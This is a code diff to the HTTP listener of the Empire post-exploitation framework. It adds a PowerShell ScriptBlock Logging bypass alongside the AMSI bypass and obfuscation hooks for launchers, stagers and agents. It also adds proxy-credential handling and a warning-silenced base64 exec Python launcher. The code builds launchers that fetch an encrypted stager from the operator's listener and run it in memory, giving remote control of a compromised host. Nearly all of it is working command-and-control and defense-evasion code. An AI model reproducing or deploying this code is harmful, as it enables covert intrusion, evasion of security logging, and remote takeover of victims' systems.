@@ -2,11 +2,11 @@ import logging
 import base64
 import random
 import os
+import ssl
 import time
 import copy
 from pydispatch import dispatcher
 from flask import Flask, request, make_response
-import pdb
 # Empire imports
 from lib.common import helpers
 from lib.common import agents
@@ -146,7 +146,7 @@ class Listener:
         return True
 
 
-    def generate_launcher(self, encode=True, userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -171,8 +171,18 @@ class Listener:
 
                 stager = ''
                 if safeChecks.lower() == 'true':
+                    # ScriptBlock Logging bypass
+                    stager = helpers.randomize_capitalization("$GroupPolicySettings = [ref].Assembly.GetType(")
+                    stager += "'System.Management.Automation.Utils'"
+                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
+                    stager += "'cachedGroupPolicySettings', 'N'+'onPublic,Static'"
+                    stager += helpers.randomize_capitalization(").GetValue($null);$GroupPolicySettings")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;"
+                    stager += helpers.randomize_capitalization("$GroupPolicySettings")
+                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;"
+
                     # @mattifestation's AMSI bypass
-                    stager = helpers.randomize_capitalization("[Ref].Assembly.GetType(")
+                    stager += helpers.randomize_capitalization("[Ref].Assembly.GetType(")
                     stager += "'System.Management.Automation.AmsiUtils'"
                     stager += helpers.randomize_capitalization(')|?{$_}|%{$_.GetField(')
                     stager += "'amsiInitFailed','NonPublic,Static'"
@@ -208,7 +218,12 @@ class Listener:
                             stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;")
                         else:
                             # TODO: implement form for other proxy credentials
-                            pass
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            domain = username.split('\\')[0]
+                            usr = username.split('\\')[1]
+                            stager += "$netcred = New-Object System.Net.NetworkCredential("+usr+","+password+","+domain+");"
+                            stager += helpers.randomize_capitalization("$wc.Proxy.Credentials = $netcred;")
 
                 # TODO: reimplement stager retries?
                 #check if we're using IPv6
@@ -252,9 +267,11 @@ class Listener:
 
                 # decode everything and kick it over to IEX to kick off execution
                 stager += helpers.randomize_capitalization("-join[Char[]](& $R $data ($IV+$K))|IEX")
-
+                
+                if obfuscate:
+                    stager = helpers.obfuscate(stager, obfuscationCommand=obfuscationCommand)
                 # base64 encode the stager and return it
-                if encode:
+                if encode and ((not obfuscate) or ("launcher" not in obfuscationCommand.lower())):
                     return helpers.powershell_launcher(stager, launcher)
                 else:
                     # otherwise return the case-randomized stager
@@ -307,10 +324,29 @@ class Listener:
                         launcherBase += "req.add_header(\"%s\",\"%s\");\n" % (headerKey, headerValue)
 
                 
-                launcherBase += "if urllib2.getproxies():\n"
-                launcherBase += "   o = urllib2.build_opener();\n"
-                launcherBase += "   o.add_handler(urllib2.ProxyHandler(urllib2.getproxies()))\n"
-                launcherBase += "   urllib2.install_opener(o);\n"
+                if proxy.lower() != "none":
+                    if proxy.lower() == "default":
+                        launcherBase += "proxy = urllib2.ProxyHandler();\n"
+                    else:
+                        proto = proxy.Split(':')[0]
+                        launcherBase += "proxy = urllib2.ProxyHandler({'"+proto+"':'"+proxy+"'});\n"
+
+                    if proxyCreds != "none":
+                        if proxyCreds == "default":
+                            launcherBase += "o = urllib2.build_opener(proxy);\n"
+                        else:
+                            launcherBase += "proxy_auth_handler = urllib2.ProxyBasicAuthHandler();\n"
+                            username = proxyCreds.split(':')[0]
+                            password = proxyCreds.split(':')[1]
+                            launcherBase += "proxy_auth_handler.add_password(None,"+proxy+","+username+","+password+");\n"
+                            launcherBase += "o = urllib2.build_opener(proxy, proxy_auth_handler);\n"
+                    else:
+                        launcherBase += "o = urllib2.build_opener(proxy);\n"
+                else:
+                    launcherBase += "o = urllib2.build_opener();\n"
+
+                #install proxy and creds globally, so they can be used with urlopen.
+                launcherBase += "urllib2.install_opener(o);\n"
 
                 # download the stager and extract the IV
                 
@@ -334,7 +370,7 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64,warnings;warnings.filterwarnings(\'ignore\');exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
@@ -346,7 +382,7 @@ class Listener:
             print helpers.color("[!] listeners/http generate_launcher(): invalid listener name specification!")
 
 
-    def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
+    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscationCommand="", language=None):
         """
         Generate the stager code needed for communications with this listener.
         """
@@ -359,6 +395,7 @@ class Listener:
         uris = [a.strip('/') for a in profile.split('|')[0].split(',')]
         launcher = listenerOptions['Launcher']['Value']
         stagingKey = listenerOptions['StagingKey']['Value']
+        workingHours = listenerOptions['WorkingHours']['Value']
         host = listenerOptions['Host']['Value']
         customHeaders = profile.split('|')[2:]
 
@@ -382,6 +419,10 @@ class Listener:
                 headers = ','.join(customHeaders)
                 stager = stager.replace("$customHeaders = \"\";","$customHeaders = \""+headers+"\";")
 
+            #patch in working hours, if any
+            if workingHours != "":
+                stager = stager.replace('WORKING_HOURS_REPLACE', workingHours)
+
             # patch the server and key information
             stager = stager.replace('REPLACE_SERVER', host)
             stager = stager.replace('REPLACE_STAGING_KEY', stagingKey)
@@ -399,7 +440,9 @@ class Listener:
                         randomizedStager += helpers.randomize_capitalization(line)
                     else:
                         randomizedStager += line
-
+            
+            if obfuscate:
+                randomizedStager = helpers.obfuscate(randomizedStager, obfuscationCommand=obfuscationCommand)
             # base64 encode the stager and return it
             if encode:
                 return helpers.enc_powershell(randomizedStager)
@@ -442,7 +485,7 @@ class Listener:
             print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
 
 
-    def generate_agent(self, listenerOptions, language=None):
+    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscationCommand=""):
         """
         Generate the full agent code needed for communications with this listener.
         """
@@ -483,9 +526,8 @@ class Listener:
             # patch in the killDate and workingHours if they're specified
             if killDate != "":
                 code = code.replace('$KillDate,', "$KillDate = '" + str(killDate) + "',")
-            if workingHours != "":
-                code = code.replace('$WorkingHours,', "$WorkingHours = '" + str(workingHours) + "',")
-
+            if obfuscate:
+                code = helpers.obfuscate(code, obfuscationCommand=obfuscationCommand)
             return code
 
         elif language == 'python':
@@ -753,7 +795,7 @@ def send_message(packets=None):
 
                                 # step 2 of negotiation -> return stager.ps1 (stage 1)
                                 dispatcher.send("[*] Sending %s stager (stage 1) to %s" % (language, clientIP), sender='listeners/http')
-                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions)
+                                stage = self.generate_stager(language=language, listenerOptions=listenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                                 return make_response(stage, 200)
 
                             elif results.startswith('ERROR:'):
@@ -816,7 +858,7 @@ def send_message(packets=None):
                                 tempListenerOptions = listenerOptions
 
                             # step 6 of negotiation -> server sends patched agent.ps1/agent.py
-                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions)
+                            agentCode = self.generate_agent(language=language, listenerOptions=tempListenerOptions, obfuscate=self.mainMenu.obfuscate, obfuscationCommand=self.mainMenu.obfuscateCommand)
                             encryptedAgent = encryption.aes_encrypt_then_hmac(sessionKey, agentCode)
                             # TODO: wrap ^ in a routing packet?
 
@@ -839,7 +881,9 @@ def send_message(packets=None):
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                certPath = os.path.abspath(certPath)
+                context = ssl.SSLContext(ssl.PROTOCOL_TLSv1)
+                context.load_cert_chain("%s/empire-chain.pem" % (certPath), "%s/empire-priv.key"  % (certPath))
                 app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
